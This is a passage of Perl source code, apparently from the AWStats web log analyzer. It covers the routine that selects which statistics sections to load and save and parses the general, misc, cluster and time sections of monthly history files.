{\n\t\t$allsections{\"sider_$_\"} = $order++;\n\t}\n\tforeach ( 1 .. @ExtraName - 1 ) { $allsections{\"extra_$_\"} = $order++; }\n\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t$allsections{\"plugin_$_\"} = $order++;\n\t}\n\tmy $withread = 0;\n\n\t# Variable used to read old format history files\n\tmy $readvisitorforbackward = 0;\n\n\tif ($Debug) {\n\t\tdebug(\n\"Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]\"\n\t\t);\n\t}\n\tif ($Debug) { debug(\"date=$date\"); }\n\n\t# Define SectionsToLoad (which sections to load)\n\tmy %SectionsToLoad = ();\n\tif ( $part eq 'all' ) {    # Load all needed sections\n\t\tmy $order = 1;\n\t\t$SectionsToLoad{'general'} = $order++;\n\n\t\t# When\n\t\t$SectionsToLoad{'time'} = $order\n\t\t  ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowHostsStats )\n\t\t\t|| $HTMLOutput{'allhosts'}\n\t\t\t|| $HTMLOutput{'lasthosts'}\n\t\t\t|| $HTMLOutput{'unknownip'} )\n\t\t{\n\t\t\t$SectionsToLoad{'visitor'} = $order++;\n\t\t}     # Must be before day, sider and session section\n\t\tif (\n\t\t\t   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'}\n\t\t\t\t&& ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )\n\t\t\t|| $HTMLOutput{'alldays'}\n\t\t  )\n\t\t{\n\t\t\t$SectionsToLoad{'day'} = $order++;\n\t\t}\n\n\t\t# Who\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowDomainsStats )\n\t\t\t|| $HTMLOutput{'alldomains'} )\n\t\t{\n\t\t\t$SectionsToLoad{'domain'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )\n\t\t\t|| $HTMLOutput{'alllogins'}\n\t\t\t|| $HTMLOutput{'lastlogins'} )\n\t\t{\n\t\t\t$SectionsToLoad{'login'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowRobotsStats )\n\t\t\t|| $HTMLOutput{'allrobots'}\n\t\t\t|| $HTMLOutput{'lastrobots'} )\n\t\t{\n\t\t\t$SectionsToLoad{'robot'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowWormsStats )\n\t\t\t|| $HTMLOutput{'allworms'}\n\t\t\t|| $HTMLOutput{'lastworms'} )\n\t\t{\n\t\t\t$SectionsToLoad{'worms'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowEMailSenders )\n\t\t\t|| $HTMLOutput{'allemails'}\n\t\t\t|| $HTMLOutput{'lastemails'} )\n\t\t{\n\t\t\t$SectionsToLoad{'emailsender'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowEMailReceivers )\n\t\t\t|| $HTMLOutput{'allemailr'}\n\t\t\t|| $HTMLOutput{'lastemailr'} )\n\t\t{\n\t\t\t$SectionsToLoad{'emailreceiver'} = $order++;\n\t\t}\n\n\t\t# Navigation\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowSessionsStats )\n\t\t\t|| $HTMLOutput{'sessions'} )\n\t\t{\n\t\t\t$SectionsToLoad{'session'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowPagesStats )\n\t\t\t|| $HTMLOutput{'urldetail'}\n\t\t\t|| $HTMLOutput{'urlentry'}\n\t\t\t|| $HTMLOutput{'urlexit'} )\n\t\t{\n\t\t\t$SectionsToLoad{'sider'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowFileTypesStats )\n\t\t\t|| $HTMLOutput{'filetypes'} )\n\t\t{\n\t\t\t$SectionsToLoad{'filetypes'} = $order++;\n\t\t}\n\t\t\n\t\tif ( $UpdateStats \n\t\t    || $MigrateStats \n\t\t    || ($HTMLOutput{'main'} && $ShowDownloadsStats )\n\t\t    || $HTMLOutput{'downloads'} )\n\t\t{\n\t\t\t$SectionsToLoad{'downloads'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOSStats )\n\t\t\t|| $HTMLOutput{'osdetail'} )\n\t\t{\n\t\t\t$SectionsToLoad{'os'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowBrowsersStats )\n\t\t\t|| $HTMLOutput{'browserdetail'} )\n\t\t{\n\t\t\t$SectionsToLoad{'browser'} = $order++;\n\t\t}\n\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownos'} ) {\n\t\t\t$SectionsToLoad{'unknownreferer'} = $order++;\n\t\t}\n\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {\n\t\t\t$SectionsToLoad{'unknownrefererbrowser'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'screensize'} = $order++;\n\t\t}\n\n\t\t# Referers\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'origin'} )\n\t\t{\n\t\t\t$SectionsToLoad{'origin'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'refererse'} )\n\t\t{\n\t\t\t$SectionsToLoad{'sereferrals'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'refererpages'} )\n\t\t{\n\t\t\t$SectionsToLoad{'pagerefs'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )\n\t\t\t|| $HTMLOutput{'keyphrases'}\n\t\t\t|| $HTMLOutput{'keywords'} )\n\t\t{\n\t\t\t$SectionsToLoad{'searchwords'} = $order++;\n\t\t}\n\t\tif ( !$withupdate && $HTMLOutput{'main'} && $ShowKeywordsStats ) {\n\t\t\t$SectionsToLoad{'keywords'} = $order++;\n\t\t}    # If we update, there is no need to load\n\t\t     # Others\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowMiscStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'misc'} = $order++;\n\t\t}\n\t\tif (\n\t\t\t   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'}\n\t\t\t\t&& ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )\n\t\t\t|| $HTMLOutput{'errors'}\n\t\t  )\n\t\t{\n\t\t\t$SectionsToLoad{'errors'} = $order++;\n\t\t}\n\t\tforeach ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{\"errors$_\"} ) {\n\t\t\t\t$SectionsToLoad{\"sider_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowClusterStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'cluster'} = $order++;\n\t\t}\n\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\tif (   $UpdateStats\n\t\t\t\t|| $MigrateStats\n\t\t\t\t|| ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )\n\t\t\t\t|| $HTMLOutput{\"allextra$_\"} )\n\t\t\t{\n\t\t\t\t$SectionsToLoad{\"extra_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{\"plugin_$_\"} ) {\n\t\t\t\t$SectionsToLoad{\"plugin_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t}\n\telse {    # Load only required sections\n\t\tmy $order = 1;\n\t\tforeach ( split( /\\s+/, $part ) ) { $SectionsToLoad{$_} = $order++; }\n\t}\n\n\t# Define SectionsToSave (which sections to save)\n\tmy %SectionsToSave = ();\n\tif ($withupdate) {\n\t\tif ( $SectionsToBeSaved eq 'all' ) {\n\t\t\t%SectionsToSave = %allsections;\n\t\t}\n\t\telse {\n\t\t\tmy $order = 1;\n\t\t\tforeach ( split( /\\s+/, $SectionsToBeSaved ) ) {\n\t\t\t\t$SectionsToSave{$_} = $order++;\n\t\t\t}\n\t\t}\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" List of sections marked for load : \"\n\t\t\t  . join(\n\t\t\t\t' ',\n\t\t\t\t(\n\t\t\t\t\tsort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }\n\t\t\t\t\t  keys %SectionsToLoad\n\t\t\t\t)\n\t\t\t  ),\n\t\t\t2\n\t\t);\n\t\tdebug(\n\t\t\t\" List of sections marked for save : \"\n\t\t\t  . join(\n\t\t\t\t' ',\n\t\t\t\t(\n\t\t\t\t\tsort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }\n\t\t\t\t\t  keys %SectionsToSave\n\t\t\t\t)\n\t\t\t  ),\n\t\t\t2\n\t\t);\n\t}\n\n# Define value for filetowrite and filetoread (Month before Year kept for backward compatibility)\n\tmy $filetowrite = '';\n\tmy $filetoread  = '';\n\tif ( $HistoryAlreadyFlushed{\"$year$month$day$hour\"}\n\t\t&& -s \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\" )\n\t{\n\n\t\t# tmp history file was already flushed\n\t\t$filetoread  = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\";\n\t\t$filetowrite = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis\";\n\t}\n\telse {\n\t\t$filetoread  = \"$DirData/$PROG$filedate$FileSuffix.txt\";\n\t\t$filetowrite = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\";\n\t}\n\tif ($Debug) { debug( \" History file to read is '$filetoread'\", 2 ); }\n\n# Is there an old data file to read or, if migrate, can we open the file for read\n\tif ( -s $filetoread || $MigrateStats ) { $withread = 1; }\n\n\t# Open files\n\tif ($withread) {\n\t\topen( HISTORY, $filetoread )\n\t\t  || error( \"Couldn't open file \\\"$filetoread\\\" for read: $!\",\n\t\t\t\"\", \"\", $MigrateStats );\n\t\tbinmode HISTORY\n\t\t  ; # Avoid premature EOF due to history files corrupted with \\cZ or bin chars\n\t}\n\tif ($withupdate) {\n\t\topen( HISTORYTMP, \">$filetowrite\" )\n\t\t  || error(\"Couldn't open file \\\"$filetowrite\\\" for write: $!\");\n\t\tbinmode HISTORYTMP;\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n'<xml xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"http://www.awstats.org/files/awstats.xsd\">'\n\t\t\t  . \"\\n\\n\";\n\t\t}\n\t\tSave_History( \"header\", $year, $month, $date );\n\t}\n\n\t# Loop on read file\n\tmy $readxml = 0;\n\tif ($withread) {\n\t\tmy $countlines = 0;\n\t\tmy $versionnum = 0;\n\t\tmy @field      = ();\n\t\twhile (<HISTORY>) {\n\t\t\tchomp $_;\n\t\t\ts/\\r//;\n\t\t\t$countlines++;\n\n\t\t\t# Test if it's xml\n\t\t\tif ( !$readxml && $_ =~ /^<xml/ ) {\n\t\t\t\t$readxml = 1;\n\t\t\t\tif ($Debug) { debug( \" Data file format is 'xml'\", 1 ); }\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# Extract version from first line\n\t\t\tif ( !$versionnum && $_ =~ /^AWSTATS DATA FILE (\\d+).(\\d+)/i ) {\n\t\t\t\t$versionnum = ( $1 * 1000 ) + $2;\n\t\t\t\tif ($Debug) { debug( \" Data file version is $versionnum\", 1 ); }\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# Analyze fields\n\t\t\t@field = split( /\\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\tif ( !$field[0] ) { next; }\n\n\t\t\t# Here version MUST be defined\n\t\t\tif ( $versionnum < 5000 ) {\n\t\t\t\terror(\n\"History file '$filetoread' is to old (version '$versionnum'). This version of AWStats is not compatible with very old history files. Remove this history file or use first a previous AWStats version to migrate it from command line with command: $PROG.$Extension -migrate=\\\"$filetoread\\\".\",\n\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t);\n\t\t\t}\n\n\t\t\t# BEGIN_GENERAL\n\t\t\t# TODO Manage GENERAL in a loop like other sections.\n\t\t\tif ( $field[0] eq 'BEGIN_GENERAL' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of GENERAL section\"); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'LastLine' || $field[0] eq \"${xmlrb}LastLine\" ) {\n\t\t\t\tif ( !$LastLine || $LastLine < int( $field[1] ) ) {\n\t\t\t\t\t$LastLine = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tif ( $field[2] ) { $LastLineNumber   = int( $field[2] ); }\n\t\t\t\tif ( $field[3] ) { $LastLineOffset   = int( $field[3] ); }\n\t\t\t\tif ( $field[4] ) { $LastLineChecksum = int( $field[4] ); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'FirstTime' || $field[0] eq \"${xmlrb}FirstTime\" )\n\t\t\t{\n\t\t\t\tif ( !$FirstTime{$date}\n\t\t\t\t\t|| $FirstTime{$date} > int( $field[1] ) )\n\t\t\t\t{\n\t\t\t\t\t$FirstTime{$date} = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'LastTime' || $field[0] eq \"${xmlrb}LastTime\" ) {\n\t\t\t\tif ( !$LastTime{$date} || $LastTime{$date} < int( $field[1] ) )\n\t\t\t\t{\n\t\t\t\t\t$LastTime{$date} = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'LastUpdate'\n\t\t\t\t|| $field[0] eq \"${xmlrb}LastUpdate\" )\n\t\t\t{\n\t\t\t\tif ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'TotalVisits'\n\t\t\t\t|| $field[0] eq \"${xmlrb}TotalVisits\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthVisits{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'TotalUnique'\n\t\t\t\t|| $field[0] eq \"${xmlrb}TotalUnique\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthUnique{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'MonthHostsKnown'\n\t\t\t\t|| $field[0] eq \"${xmlrb}MonthHostsKnown\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthHostsKnown{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'MonthHostsUnknown'\n\t\t\t\t|| $field[0] eq \"${xmlrb}MonthHostsUnknown\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthHostsUnknown{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (\n\t\t\t\t(\n\t\t\t\t\t   $field[0] eq 'END_GENERAL'\n\t\t\t\t\t|| $field[0] eq \"${xmleb}END_GENERAL\"\n\t\t\t\t)\n\t\t\t  )\n\t\t\t{\n\t\t\t\tif ($Debug) { debug(\" End of GENERAL section\"); }\n\t\t\t\tif ( $MigrateStats && !$BadFormatWarning{ $year . $month } ) {\n\t\t\t\t\t$BadFormatWarning{ $year . $month } = 1;\n\t\t\t\t\twarning(\n\"Warning: You are migrating a file that is already a recent version (migrate not required for files version $versionnum).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\n\t\t\t\tdelete $SectionsToLoad{'general'};\n\t\t\t\tif ( $SectionsToSave{'general'} ) {\n\t\t\t\t\tSave_History( 'general', $year, $month, $date, $lastlinenb,\n\t\t\t\t\t\t$lastlineoffset, $lastlinechecksum );\n\t\t\t\t\tdelete $SectionsToSave{'general'};\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_MISC\n\t\t\tif ( $field[0] eq 'BEGIN_MISC' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of MISC section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'misc'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_misc_p{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_misc_h{ $field[0] } += int( $field[2] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_misc_k{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_MISC'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_MISC\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_MISC'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_MISC\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section MISC not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of MISC section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'misc'};\n\t\t\t\tif ( $SectionsToSave{'misc'} ) {\n\t\t\t\t\tSave_History( 'misc', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'misc'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_misc_p = ();\n\t\t\t\t\t\t%_misc_h = ();\n\t\t\t\t\t\t%_misc_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_CLUSTER\n\t\t\tif ( $field[0] eq 'BEGIN_CLUSTER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of CLUSTER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'cluster'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_cluster_p{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_cluster_h{ $field[0] } += int( $field[2] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_cluster_k{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_CLUSTER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_CLUSTER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_CLUSTER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_CLUSTER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section CLUSTER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of CLUSTER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'cluster'};\n\t\t\t\tif ( $SectionsToSave{'cluster'} ) {\n\t\t\t\t\tSave_History( 'cluster', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'cluster'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_cluster_p = ();\n\t\t\t\t\t\t%_cluster_h = ();\n\t\t\t\t\t\t%_cluster_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_TIME\n\t\t\tif ( $field[0] eq 'BEGIN_TIME' ) {\n\t\t\t\tmy $monthpages          = 0;\n\t\t\t\tmy $monthhits           = 0;\n\t\t\t\tmy $monthbytes          = 0;\n\t\t\t\tmy $monthnotviewedpages = 0;\n\t\t\t\tmy $monthnotviewedhits  = 0;\n\t\t\t\tmy $monthnotviewedbytes = 0;\n\t\t\t\tif ($Debug) { debug(\" Begin of TIME section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\n\t\t\t\t\tif ( $field[0] ne '' )\n\t\t\t\t\t{    # Test on ne '' because field[0] is '0' for hour 0)\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'time'} ) {\n\t\t\t\t\t\t\tif (   $withupdate\n\t\t\t\t\t\t\t\t|| $MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t|| $MonthRequired eq \"$month\" )\n\t\t\t\t\t\t\t{    # Still required\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_time_p[ $field[0] ] += int( $field[1] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_time_h[ $field[0] ] += int( $field[2] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_time_k[ $field[0] ] += int( $field[3] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_p[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[4] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[5] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_h[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[5] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[6] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_k[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[6] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$monthpages          += int( $field[1] );\n\t\t\t\t\t\t\t$monthhits           += int( $field[2] );\n\t\t\t\t\t\t\t$monthbytes          += int( $field[3] );\n\t\t\t\t\t\t\t$monthnotviewedpages += int( $field[4] || 0 );\n\t\t\t\t\t\t\t$monthnotviewedhits  += int( $field[5] || 0 );\n\t\t\t\t\t\t\t$monthnotviewedbytes += int( $field[6] || 0 );\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_TIME'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_TIME\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_TIME'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_TIME\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section TIME not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of TIME section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$MonthPages{ $year . $month }          += $monthpages;\n\t\t\t\t$MonthHits{ $year . $month }           += $monthhits;\n\t\t\t\t$MonthBytes{ $year . $month }          += $monthbytes;\n\t\t\t\t$MonthNotViewedPages{ $year . $month } += $monthnotviewedpages;\n\t\t\t\t$MonthNotViewedHits{ $year . $month }  += $monthnotviewedhits;\n\t\t\t\t$MonthNotViewedBytes{ $year . $month } += $monthnotviewedbytes;\n\t\t\t\tdelete $SectionsToLoad{'time'};\n\n\t\t\t\tif ( $SectionsToSave{'time'} ) {\n\t\t\t\t\tSave_History( 'time', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'time'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t@_time_p    = ();\n\t\t\t\t\t\t@_time_h    = ();\n\t\t\t\t\t\t@_time_k    = ();\n\t\t\t\t\t\t@_time_nv_p = ();\n\t\t\t\t\t\t@_time_nv_h = ();\n\t\t\t\t\t\t@_time_nv_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ORIGIN\n\t\t\tif ( $field[0] eq 'BEGIN_ORIGIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ORIGIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) 